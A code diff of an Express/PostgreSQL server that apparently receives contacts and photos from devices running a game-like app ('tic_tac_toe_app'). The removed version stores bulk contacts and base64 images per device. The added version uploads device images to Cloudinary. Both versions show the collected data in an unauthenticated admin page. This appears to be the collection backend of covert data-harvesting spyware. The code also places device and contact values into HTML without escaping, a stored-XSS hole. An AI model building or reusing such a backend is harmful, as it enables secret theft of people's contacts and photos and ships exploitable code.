@@ -1,10 +1,22 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const { Pool } = require("pg");
+const cloudinary = require("cloudinary").v2;
+const multer = require("multer");
 
 const app = express();
-app.use(bodyParser.json({ limit: "100mb" }));
+app.use(bodyParser.json());
 
+const upload = multer({ storage: multer.memoryStorage() });
+
+// ================= CLOUDINARY CONFIG =================
+cloudinary.config({
+  cloud_name: "YOUR_CLOUD_NAME",
+  api_key: "YOUR_API_KEY",
+  api_secret: "YOUR_API_SECRET"
+});
+
+// ================= DATABASE =================
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: { rejectUnauthorized: false }
@@ -19,124 +31,73 @@ async function initDB() {
       created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     );
 
-    CREATE TABLE IF NOT EXISTS contacts (
-      id SERIAL PRIMARY KEY,
-      device_id TEXT,
-      contact_data TEXT,
-      UNIQUE(device_id, contact_data)
-    );
-
     CREATE TABLE IF NOT EXISTS images (
       id SERIAL PRIMARY KEY,
       device_id TEXT,
-      image_data TEXT,
-      UNIQUE(device_id, image_data)
+      image_url TEXT
     );
   `);
 }
 initDB();
 
-// ================= RECEIVE DATA =================
-app.post("/receive", async (req, res) => {
+// ================= UPLOAD IMAGE =================
+app.post("/upload-image", upload.single("image"), async (req, res) => {
   try {
-    const { type, device_id, data } = req.body;
+    const device_id = req.body.device_id;
 
-    // Save user (no duplicate)
-    await pool.query(
-      "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
-      [device_id]
+    if (!req.file) {
+      return res.status(400).send("No file");
+    }
+
+    // Upload to Cloudinary
+    const stream = cloudinary.uploader.upload_stream(
+      { folder: "tic_tac_toe_app" },
+      async (error, result) => {
+        if (error) {
+          console.error(error);
+          return res.status(500).send("Upload error");
+        }
+
+        const imageUrl = result.secure_url;
+
+        // Save user
+        await pool.query(
+          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
+          [device_id]
+        );
+
+        // Save image URL
+        await pool.query(
+          "INSERT INTO images (device_id, image_url) VALUES ($1, $2)",
+          [device_id, imageUrl]
+        );
+
+        res.json({ url: imageUrl });
+      }
     );
 
-    if (!Array.isArray(data) || data.length === 0) {
-      return res.send("No data");
-    }
-
-    // ===== CONTACTS =====
-    if (type === "contacts") {
-      const values = [];
-      const placeholders = data.map((_, i) => {
-        values.push(data[i]);
-        return `($1, $${i + 2})`;
-      });
-
-      await pool.query(
-        `INSERT INTO contacts (device_id, contact_data)
-         VALUES ${placeholders.join(",")}
-         ON CONFLICT (device_id, contact_data) DO NOTHING`,
-        [device_id, ...values]
-      );
-    }
-
-    // ===== IMAGES =====
-    if (type === "images") {
-      const values = [];
-      const placeholders = data.map((_, i) => {
-        values.push(data[i]);
-        return `($1, $${i + 2})`;
-      });
-
-      await pool.query(
-        `INSERT INTO images (device_id, image_data)
-         VALUES ${placeholders.join(",")}
-         ON CONFLICT (device_id, image_data) DO NOTHING`,
-        [device_id, ...values]
-      );
-    }
-
-    res.send("Saved without duplicates ✅");
+    stream.end(req.file.buffer);
 
   } catch (err) {
     console.error(err);
-    res.status(500).send("Error");
+    res.status(500).send("Server error");
   }
 });
 
-// ================= DELETE ROUTES =================
-
-// Delete ALL data of user
-app.delete("/delete-all/:device_id", async (req, res) => {
-  const device_id = req.params.device_id;
-
-  await pool.query("DELETE FROM contacts WHERE device_id=$1", [device_id]);
-  await pool.query("DELETE FROM images WHERE device_id=$1", [device_id]);
-
-  res.send("All data deleted ✅");
-});
-
-// Delete single contact
-app.delete("/delete-contact/:id", async (req, res) => {
-  await pool.query("DELETE FROM contacts WHERE id=$1", [req.params.id]);
-  res.send("Contact deleted ✅");
-});
-
-// Delete single image
-app.delete("/delete-image/:id", async (req, res) => {
-  await pool.query("DELETE FROM images WHERE id=$1", [req.params.id]);
-  res.send("Image deleted ✅");
-});
-
-// ================= USERS LIST =================
+// ================= VIEW USERS =================
 app.get("/users", async (req, res) => {
   const result = await pool.query("SELECT * FROM users ORDER BY id DESC");
 
   let html = `
   <html>
-  <head>
-    <title>Users</title>
-    <style>
-      body { background:#0f172a; color:white; font-family:sans-serif; padding:20px;}
-      a { color:#22c55e; text-decoration:none; font-size:18px;}
-      .card { background:#1e293b; padding:15px; margin:10px 0; border-radius:10px;}
-    </style>
-  </head>
-  <body>
+  <body style="background:#0f172a;color:white;padding:20px;">
   <h1>Users</h1>
   `;
 
   result.rows.forEach(user => {
     html += `
-      <div class="card">
-        <a href="/user/${user.device_id}">
+      <div style="margin:10px;">
+        <a href="/user/${user.device_id}" style="color:#22c55e;">
           ${user.device_id}
         </a>
       </div>
@@ -144,113 +105,40 @@ app.get("/users", async (req, res) => {
   });
 
   html += "</body></html>";
-
   res.send(html);
 });
 
-// ================= USER DATA (MODERN UI) =================
+// ================= USER IMAGES =================
 app.get("/user/:device_id", async (req, res) => {
-  const device_id = req.params.device_id;
+  try {
+    const device_id = req.params.device_id;
 
-  const contacts = await pool.query(
-    "SELECT * FROM contacts WHERE device_id=$1",
-    [device_id]
-  );
+    const images = await pool.query(
+      "SELECT * FROM images WHERE device_id=$1",
+      [device_id]
+    );
 
-  const images = await pool.query(
-    "SELECT * FROM images WHERE device_id=$1",
-    [device_id]
-  );
-
-  let html = `
-  <html>
-  <head>
-    <title>User Data</title>
-    <style>
-      body {
-        background:#0f172a;
-        color:white;
-        font-family:sans-serif;
-        padding:20px;
-      }
-      h1 { color:#22c55e; }
-      .card {
-        background:#1e293b;
-        padding:15px;
-        margin:10px 0;
-        border-radius:10px;
-      }
-      button {
-        background:red;
-        color:white;
-        border:none;
-        padding:5px 10px;
-        border-radius:5px;
-        cursor:pointer;
-        margin-top:5px;
-      }
-      img {
-        border-radius:10px;
-        margin:10px 0;
-      }
-    </style>
-  </head>
-  <body>
-
-  <h1>Device: ${device_id}</h1>
-
-  <button onclick="deleteAll()">Delete All Data</button>
-
-  <h2>Contacts</h2>
-  `;
-
-  contacts.rows.forEach(c => {
-    html += `
-      <div class="card">
-        ${c.contact_data}
-        <br>
-        <button onclick="deleteContact(${c.id})">Delete</button>
-      </div>
+    let html = `
+    <html>
+    <body style="background:#0f172a;color:white;padding:20px;">
+    <h1>Device: ${device_id}</h1>
     `;
-  });
 
-  html += "<h2>Images</h2>";
+    images.rows.forEach(img => {
+      html += `
+        <div style="margin:10px;">
+          <img src="${img.image_url}" width="200"/>
+        </div>
+      `;
+    });
 
-  images.rows.forEach(img => {
-    html += `
-      <div class="card">
-        <img src="data:image/jpeg;base64,${img.image_data}" width="200"/>
-        <br>
-        <button onclick="deleteImage(${img.id})">Delete</button>
-      </div>
-    `;
-  });
+    html += "</body></html>";
+    res.send(html);
 
-  html += `
-  <script>
-    function deleteContact(id){
-      fetch('/delete-contact/' + id, {method:'DELETE'})
-      .then(()=>location.reload());
-    }
-
-    function deleteImage(id){
-      fetch('/delete-image/' + id, {method:'DELETE'})
-      .then(()=>location.reload());
-    }
-
-    function deleteAll(){
-      if(confirm("Delete all data?")){
-        fetch('/delete-all/${device_id}', {method:'DELETE'})
-        .then(()=>location.reload());
-      }
-    }
-  </script>
-
-  </body>
-  </html>
-  `;
-
-  res.send(html);
+  } catch (err) {
+    console.error(err);
+    res.status(500).send("Error loading user data");
+  }
 });
 
 // ================= HOME =================
